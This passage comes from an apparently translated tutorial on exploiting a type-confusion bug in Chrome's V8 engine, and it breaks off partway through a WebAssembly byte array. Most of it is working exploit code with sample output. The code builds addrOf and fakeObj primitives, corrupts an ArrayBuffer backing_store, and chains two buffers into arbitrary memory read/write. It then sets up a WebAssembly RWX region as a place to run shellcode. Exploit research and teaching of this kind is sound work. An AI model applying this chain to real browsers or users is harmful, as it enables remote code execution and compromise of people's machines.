&lt;p&gt;&lt;img src=&#34;image.png&#34; alt=&#34;ref: [https://jhalon.github.io/chrome-browser-exploitation-3/](https://jhalon.github.io/chrome-browser-exploitation-3/)&#34;&gt;&lt;/p&gt;
&lt;p&gt;ref: &lt;a href=&#34;https://jhalon.github.io/chrome-browser-exploitation-3/&#34;&gt;https://jhalon.github.io/chrome-browser-exploitation-3/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ArrayBuffer backing_store is at offset 32; by adding another inline property &lt;code&gt;x2&lt;/code&gt; we can reach and overwrite that pointer via our primitive.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image%201.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Using one overwritten ArrayBuffer is useful, but repeatedly triggering the bug to change the backing_store each time you want to read/write many addresses is tedious. A more practical trick uses &lt;strong&gt;two ArrayBuffers&lt;/strong&gt;:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Corrupt the backing_store pointer of the first ArrayBuffer so it points to the second ArrayBuffer object.&lt;/li&gt;
&lt;li&gt;Use a &lt;code&gt;TypedArray&lt;/code&gt; view on the first buffer to write into a specific property index which, because we pointed it at the second buffer, will overwrite the second buffer&amp;#x2019;s backing_store pointer.&lt;/li&gt;
&lt;li&gt;Now the second buffer&amp;#x2019;s backing_store points at an attacker-controlled address. Using a &lt;code&gt;TypedArray&lt;/code&gt; view on the second buffer lets you read/write that memory directly.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;This two-buffer technique lets you rapidly read/write arbitrary heap addresses without retriggering the vulnerability for every access. Diagram showing the two-buffer trick:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image%202.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;Coding&#34;&gt;&lt;a href=&#34;#Coding&#34; class=&#34;headerlink&#34; title=&#34;Coding)&#34;&gt;&lt;/a&gt;Coding)&lt;/h3&gt;&lt;p&gt;We previously hard-coded the overwritten value. Now we make the primitive accept a parameter for the new value, and we change &lt;code&gt;p1&lt;/code&gt; to have &lt;strong&gt;two inline properties&lt;/strong&gt;, because the second inline property overlaps with the ArrayBuffer &lt;code&gt;backing_store&lt;/code&gt;. So the &lt;code&gt;vuln&lt;/code&gt; function must write to the second inline property to overwrite the backing_store pointer.&lt;/p&gt;
&lt;p&gt;Also add a &lt;code&gt;toNumber&lt;/code&gt; helper to convert &lt;code&gt;BigInt&lt;/code&gt; addresses into the floating representation used in the type-confused slot (because our type confusion returns a float, we need to convert addresses into float bit patterns).&lt;/p&gt;
&lt;p&gt;Final &lt;code&gt;fakeObj&lt;/code&gt; primitive:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;BigInt.prototype.toNumber = &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;toNumber&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;{
    uint64View[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;;
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; floatView[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;];
};

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;fakeObj&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;obj, newValue&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&#34;hljs-built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;`&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    function vuln(obj) {&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      obj.inline;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      this.Object.create(obj);&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      // Write to Backing Store Pointer via Property x2&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      let orig = obj.p&lt;span class=&#34;hljs-subst&#34;&gt;${p1}&lt;/span&gt;.x2;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      obj.p&lt;span class=&#34;hljs-subst&#34;&gt;${p1}&lt;/span&gt;.x2 = &lt;span class=&#34;hljs-subst&#34;&gt;${newValue.toNumber()}&lt;/span&gt;;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      return orig;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    }&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;  `&lt;/span&gt;);

    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; pValues = [];
    &lt;span class=&#34;hljs-comment&#34;&gt;// x2 Property Overlaps Backing Store Pointer for Array Buffer&lt;/span&gt;
    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; o = {&lt;span class=&#34;hljs-attr&#34;&gt;x1&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;, &lt;span class=&#34;hljs-attr&#34;&gt;x2&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;13.38&lt;/span&gt;};
    pValues[p1] = o;
    pValues[p2] = obj;

    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;10000&lt;/span&gt;; i++) {
        &lt;span class=&#34;hljs-comment&#34;&gt;// Force Map Check and Redundancy Elimination&lt;/span&gt;
        o.x2 = &lt;span class=&#34;hljs-number&#34;&gt;13.38&lt;/span&gt;;
        &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; res = vuln(makeObj(pValues));
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (res != &lt;span class=&#34;hljs-number&#34;&gt;13.38&lt;/span&gt;) {
            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; res.toBigInt();
        }
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[!] fakeObj Primitive Failed&amp;quot;&lt;/span&gt;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We must also update the &lt;code&gt;addrOf&lt;/code&gt; primitive in the same way (use &lt;code&gt;x2&lt;/code&gt;):&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;addrOf&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;obj&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&#34;hljs-built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;`&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    function vuln(obj) {&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      obj.inline;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      this.Object.create(obj);&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      // Trigger our type-confusion by accessing an out-of-bound property&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      // This will load p1 from our object thinking it&amp;apos;s a Double, but instead&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      // due to overlap, it will load p2 which is an Object&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      return obj.p&lt;span class=&#34;hljs-subst&#34;&gt;${p1}&lt;/span&gt;.x2;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    }&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;  `&lt;/span&gt;);

    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; pValues = [];
    &lt;span class=&#34;hljs-comment&#34;&gt;// x2 Property Overlaps Backing Store Pointer for Array Buffer&lt;/span&gt;
    pValues[p1] = {&lt;span class=&#34;hljs-attr&#34;&gt;x1&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;, &lt;span class=&#34;hljs-attr&#34;&gt;x2&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;13.38&lt;/span&gt;};
    pValues[p2] = {&lt;span class=&#34;hljs-attr&#34;&gt;y&lt;/span&gt;: obj};

    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;10000&lt;/span&gt;; i++) {
        &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; res = vuln(makeObj(pValues));
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (res != &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;) {
            &lt;span class=&#34;hljs-comment&#34;&gt;// Subtract 1n from address due to pointer tagging.&lt;/span&gt;
            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; res.toBigInt() - &lt;span class=&#34;hljs-number&#34;&gt;1n&lt;/span&gt;;
        }
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[!] AddrOf Primitive Failed&amp;quot;&lt;/span&gt;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;p&gt;Now that the exploit script is modified, we should be able to overwrite an ArrayBuffer&amp;#x2019;s backing_store pointer. Let&amp;#x2019;s test it: create a new 1024-byte ArrayBuffer, leak its address, then overwrite its backing_store with &lt;code&gt;0x41414141&lt;/code&gt; and verify using &lt;code&gt;%DebugPrint&lt;/code&gt; that the backing_store changed.&lt;/p&gt;
&lt;p&gt;Append to the script:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Finding Overlapping Properties...&amp;quot;&lt;/span&gt;);
findOverlappingProperties();
print(&lt;span class=&#34;hljs-string&#34;&gt;`[+] Properties p&lt;span class=&#34;hljs-subst&#34;&gt;${p1}&lt;/span&gt; and p&lt;span class=&#34;hljs-subst&#34;&gt;${p2}&lt;/span&gt; overlap!`&lt;/span&gt;);

&lt;span class=&#34;hljs-comment&#34;&gt;// Create Array Buffer&lt;/span&gt;
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; arrBuf1 = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ArrayBuffer&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;1024&lt;/span&gt;);

print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Leaking ArrayBuffer Address...&amp;quot;&lt;/span&gt;);
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; arrBuf1fAddr = addrOf(arrBuf1);
print(&lt;span class=&#34;hljs-string&#34;&gt;`[+] ArrayBuffer Address: 0x&lt;span class=&#34;hljs-subst&#34;&gt;${arrBuf1fAddr.toString(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)}&lt;/span&gt;`&lt;/span&gt;);
%DebugPrint(arrBuf1)

print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Corrupting ArrayBuffer Backing Store Address...&amp;quot;&lt;/span&gt;)
&lt;span class=&#34;hljs-comment&#34;&gt;// Overwrite Backing Store Pointer with 0x41414141&lt;/span&gt;
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; ret = fakeObj(arrBuf1, &lt;span class=&#34;hljs-number&#34;&gt;0x41414141n&lt;/span&gt;);
print(&lt;span class=&#34;hljs-string&#34;&gt;`[+] Original Leaked Data: 0x&lt;span class=&#34;hljs-subst&#34;&gt;${ret.toString(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)}&lt;/span&gt;`&lt;/span&gt;);
%DebugPrint(arrBuf1)&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Example output:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs prolog&#34;&gt;[+] &lt;span class=&#34;hljs-symbol&#34;&gt;Finding&lt;/span&gt; &lt;span class=&#34;hljs-symbol&#34;&gt;Overlapping&lt;/span&gt; &lt;span class=&#34;hljs-symbol&#34;&gt;Properties&lt;/span&gt;...
[+] &lt;span class=&#34;hljs-symbol&#34;&gt;Properties&lt;/span&gt; p15 and p11 overlap!
[+] &lt;span class=&#34;hljs-symbol&#34;&gt;Leaking&lt;/span&gt; &lt;span class=&#34;hljs-symbol&#34;&gt;ArrayBuffer&lt;/span&gt; &lt;span class=&#34;hljs-symbol&#34;&gt;Address&lt;/span&gt;...
[+] &lt;span class=&#34;hljs-symbol&#34;&gt;ArrayBuffer&lt;/span&gt; &lt;span class=&#34;hljs-symbol&#34;&gt;Address&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;0x2a164919360&lt;/span&gt;
...
[+] &lt;span class=&#34;hljs-symbol&#34;&gt;Corrupting&lt;/span&gt; &lt;span class=&#34;hljs-symbol&#34;&gt;ArrayBuffer&lt;/span&gt; &lt;span class=&#34;hljs-symbol&#34;&gt;Backing&lt;/span&gt; &lt;span class=&#34;hljs-symbol&#34;&gt;Store&lt;/span&gt; &lt;span class=&#34;hljs-symbol&#34;&gt;Address&lt;/span&gt;...
[+] &lt;span class=&#34;hljs-symbol&#34;&gt;Original&lt;/span&gt; &lt;span class=&#34;hljs-symbol&#34;&gt;Leaked&lt;/span&gt; &lt;span class=&#34;hljs-symbol&#34;&gt;Data&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;0x1aeda203210&lt;/span&gt;
&lt;span class=&#34;hljs-symbol&#34;&gt;DebugPrint&lt;/span&gt;: ...
 - backing_store: &lt;span class=&#34;hljs-number&#34;&gt;0000000041414141&lt;/span&gt;
...
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;p&gt;Now that we can overwrite backing_store, use two ArrayBuffers to build AAR/AAW primitives:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; memory = {
    read64(addr) {
        view1[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = addr;
        &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; view2 = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; BigUint64Array(arrBuf2);
        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; view2[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;];
    },
    write64(addr, ptr) {
        view1[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = addr;
        &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; view2 = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; BigUint64Array(arrBuf2);
        view2[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = ptr;
    }
};&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Summary: using type confusion we first obtained relative R/W via overlapping properties; by corrupting &lt;code&gt;ArrayBuffer&lt;/code&gt; backing_store and employing two buffers we convert that into arbitrary-address R/W. &lt;/p&gt;
&lt;p&gt;Now let&amp;#x2019;s run the code and get code execution!&lt;/p&gt;
&lt;h2 id=&#34;1-2-AAR-W-&amp;#x2192;-RCE&#34;&gt;&lt;a href=&#34;#1-2-AAR-W-&amp;#x2192;-RCE&#34; class=&#34;headerlink&#34; title=&#34;1.2 AAR/W &amp;#x2192; RCE&#34;&gt;&lt;/a&gt;1.2 AAR/W &amp;#x2192; RCE&lt;/h2&gt;&lt;h3 id=&#34;Toward-Gaining-Code-Execution&#34;&gt;&lt;a href=&#34;#Toward-Gaining-Code-Execution&#34; class=&#34;headerlink&#34; title=&#34;Toward Gaining Code Execution&#34;&gt;&lt;/a&gt;Toward Gaining Code Execution&lt;/h3&gt;&lt;p&gt;Now that we have AAR/W, we need to execute code &amp;#x2014; but unfortunately we can&amp;#x2019;t just write shellcode into the V8 heap or an ArrayBuffer and run it, because DEP(Data Execution Prevention) is enabled. A common alternative is to target JIT memory.&lt;/p&gt;
&lt;p&gt;When JavaScript code is JIT-compiled, the compiler writes machine instructions into memory pages that must be executed, so those pages are typically given RWX(Read-Write-Execute) permissions. An attacker can leak a pointer to a JIT-compiled function, overwrite the code at that address with shellcode, and then call the function to run the shellcode.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;However&lt;/em&gt;, since 2018 the V8 team added &lt;code&gt;write_protect_code_memory&lt;/code&gt;. That protection flips JIT pages to RX (Read-Execute) at execution time and to RW(Read-Write) only when writing, so it&amp;#x2019;s no longer feasible to treat JIT memory as permanently RWX. As with pwnable challenges, one workaround is to build a ROP(Return-Oriented Programming) chain: manipulate vtables, JIT function pointers, or the stack to achieve code execution. ROP construction is fairly involved, though, so instead we&amp;#x2019;ll use a simpler and more reliable approach: &lt;strong&gt;WebAssembly(wasm)&lt;/strong&gt;.&lt;/p&gt;
&lt;h3 id=&#34;WebAssembly-basics&#34;&gt;&lt;a href=&#34;#WebAssembly-basics&#34; class=&#34;headerlink&#34; title=&#34;WebAssembly basics&#34;&gt;&lt;/a&gt;WebAssembly basics&lt;/h3&gt;&lt;p&gt;WebAssembly is a binary format designed to run low-level code in the browser (often compiled from C/C++), and it interoperates with JavaScript.&lt;/p&gt;
&lt;p&gt;V8 does not fully optimize wasm code immediately; it first uses a baseline compiler called &lt;strong&gt;Liftoff&lt;/strong&gt; to produce machine code. Wasm also uses JIT memory, so machine code is placed in executable pages. Importantly, because of asm.js compatibility reasons, the write-protect flag for wasm was (at the time) typically disabled, which made wasm a very useful exploitation primitive.&lt;/p&gt;
&lt;p&gt;When a wasm module is instantiated in V8, function calls go through a &lt;strong&gt;jump table&lt;/strong&gt;. Each function slot in that table points to the actual machine code for the function (a &lt;code&gt;WasmCode&lt;/code&gt; object). Those pointers reference executable memory, so an attacker who can overwrite them could hijack execution. (Back in 2018 the wasm jump table in the V8 heap was readable/writable/executable and thus easy to hijack &amp;#x2014; modern V8 has hardened this, though &amp;#x315C;.&amp;#x315C;.)&lt;/p&gt;
&lt;h3 id=&#34;addrOf-function-re-building&#34;&gt;&lt;a href=&#34;#addrOf-function-re-building&#34; class=&#34;headerlink&#34; title=&#34;addrOf function re-building&#34;&gt;&lt;/a&gt;addrOf function re-building&lt;/h3&gt;&lt;p&gt;Using our read/write primitives we can leak the wasm instance object address and the RWX jump table pointer. However, the earlier &lt;code&gt;addrOf&lt;/code&gt; primitive relied on overlapping properties (which can corrupt other functionality), so we need a safer approach.&lt;/p&gt;
&lt;p&gt;We will build a new &lt;code&gt;addrOf&lt;/code&gt; by adding an &lt;strong&gt;out-of-line property&lt;/strong&gt; to an &lt;code&gt;ArrayBuffer&lt;/code&gt;, referencing the target object there, and then reading the property storage metadata via our memory read primitive to leak the object pointer. This avoids overwriting inline object fields.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Why this works&lt;/strong&gt;_&lt;br&gt;&lt;strong&gt;**An &lt;code&gt;ArrayBuffer&lt;/code&gt; manages raw bytes and, separately from inline properties, it has a &lt;/strong&gt;property storage**(property backing store). If we assign an object to an out-of-line property (e.g., &lt;code&gt;arrBuf.leakMe = obj&lt;/code&gt;), a pointer to the object is placed in that property storage. By using our arbitrary memory read primitive to inspect that property store&amp;#x2019;s metadata, we can indirectly obtain the object pointer. In other words, we can leak an object&amp;#x2019;s address without overwriting its fields.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; memory = {
  addrOf(obj) {
    &lt;span class=&#34;hljs-comment&#34;&gt;// Set object address to new out-of-line property called leakme&lt;/span&gt;
    arrBuf2.leakMe = obj;
    &lt;span class=&#34;hljs-comment&#34;&gt;// Use read64 primitive to leak the properties backing store address of our array buffer&lt;/span&gt;
    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; props = &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.read64(arrBuf2Addr + &lt;span class=&#34;hljs-number&#34;&gt;8n&lt;/span&gt;) - &lt;span class=&#34;hljs-number&#34;&gt;1n&lt;/span&gt;;
    &lt;span class=&#34;hljs-comment&#34;&gt;// Read offset 16 from the array buffer backing store and return the address of our object&lt;/span&gt;
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.read64(props + &lt;span class=&#34;hljs-number&#34;&gt;16n&lt;/span&gt;) - &lt;span class=&#34;hljs-number&#34;&gt;1n&lt;/span&gt;;
  }
};&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Using this technique we can finally leak the &lt;code&gt;wasmInstance&lt;/code&gt; address and the RWX jump table pointer for that instance.&lt;/p&gt;
&lt;h2 id=&#34;1-3-RCE-PoC&#34;&gt;&lt;a href=&#34;#1-3-RCE-PoC&#34; class=&#34;headerlink&#34; title=&#34;1.3. RCE PoC&#34;&gt;&lt;/a&gt;1.3. RCE PoC&lt;/h2&gt;&lt;p&gt;Now let&amp;#x2019;s combine everything we&amp;#x2019;ve covered so far.&lt;/p&gt;
&lt;h3 id=&#34;1-Build-primitives&#34;&gt;&lt;a href=&#34;#1-Build-primitives&#34; class=&#34;headerlink&#34; title=&#34;[1] Build primitives&#34;&gt;&lt;/a&gt;[1] Build primitives&lt;/h3&gt;&lt;p&gt;Find the address of the second &lt;code&gt;ArrayBuffer&lt;/code&gt; with &lt;code&gt;addrOf&lt;/code&gt;, change the &lt;code&gt;backing_store&lt;/code&gt; pointer of the first buffer to point to the second buffer&amp;#x2019;s address, and then build memory read/write primitives from that.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// Create Array Buffers&lt;/span&gt;
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; arrBuf1 = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ArrayBuffer&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;1024&lt;/span&gt;);
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; arrBuf2 = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ArrayBuffer&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;1024&lt;/span&gt;);

&lt;span class=&#34;hljs-comment&#34;&gt;// Leak Address of arrBuf2&lt;/span&gt;
print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Leaking ArrayBuffer Address...&amp;quot;&lt;/span&gt;);
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; arrBuf2Addr = addrOf(arrBuf2);
print(&lt;span class=&#34;hljs-string&#34;&gt;`[+] ArrayBuffer Address @ 0x&lt;span class=&#34;hljs-subst&#34;&gt;${arrBuf2Addr.toString(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)}&lt;/span&gt;`&lt;/span&gt;);

&lt;span class=&#34;hljs-comment&#34;&gt;// Corrupt Backing Store Pointer of arrBuf1 with Address to arrBuf2&lt;/span&gt;
print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Corrupting ArrayBuffer Backing Store...&amp;quot;&lt;/span&gt;)
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; originalArrBuf1BackingStore = fakeObj(arrBuf1, arrBuf2Addr);

&lt;span class=&#34;hljs-comment&#34;&gt;// Store Original Backing Store Pointer of arrBuf2&lt;/span&gt;
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; view1 = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; BigUint64Array(arrBuf1)
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; originalArrBuf2BackingStore = view1[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;]

&lt;span class=&#34;hljs-comment&#34;&gt;// Construct Memory Primitives via Array Buffers&lt;/span&gt;
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; memory = {
  write(addr, bytes) {
    view1[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = addr;
    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; view2 = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;Uint8Array&lt;/span&gt;(arrBuf2);
    view2.set(bytes);
  },
  read64(addr) {
    view1[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = addr;
    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; view2 = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; BigUint64Array(arrBuf2);
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; view2[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;];
  },
  write64(addr, ptr) {
    view1[&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = addr;
    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; view2 = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; BigUint64Array(arrBuf2);
    view2[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = ptr;
  },
  addrOf(obj) {
    arrBuf2.leakMe = obj;
    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; props = &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.read64(arrBuf2Addr + &lt;span class=&#34;hljs-number&#34;&gt;8n&lt;/span&gt;) - &lt;span class=&#34;hljs-number&#34;&gt;1n&lt;/span&gt;;
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;.read64(props + &lt;span class=&#34;hljs-number&#34;&gt;16n&lt;/span&gt;) - &lt;span class=&#34;hljs-number&#34;&gt;1n&lt;/span&gt;;
  }
};

print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Constructed Memory Read and Write Primitive!&amp;quot;&lt;/span&gt;);&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;2-Create-a-WebAssembly-instance&#34;&gt;&lt;a href=&#34;#2-Create-a-WebAssembly-instance&#34; class=&#34;headerlink&#34; title=&#34;[2] Create a WebAssembly instance&#34;&gt;&lt;/a&gt;[2] Create a WebAssembly instance&lt;/h3&gt;&lt;p&gt;This wasm code block compiles a simple &amp;#x201C;dummy function&amp;#x201D; into JIT memory. When the instance is created, an internal &lt;strong&gt;RWX jump table&lt;/strong&gt; is allocated. We can later overwrite that RWX memory with shellcode and execute it.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Generating a WebAssembly Instance...&amp;quot;&lt;/span&gt;);

&lt;span class=&#34;hljs-comment&#34;&gt;// Generate RWX region for Shellcode via WASM&lt;/span&gt;
&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; wasmCode = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;Uint8Array&lt;/span&gt;([&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;97&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;115&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;109&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;133&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;96&lt;/span&gt;,&lt;span 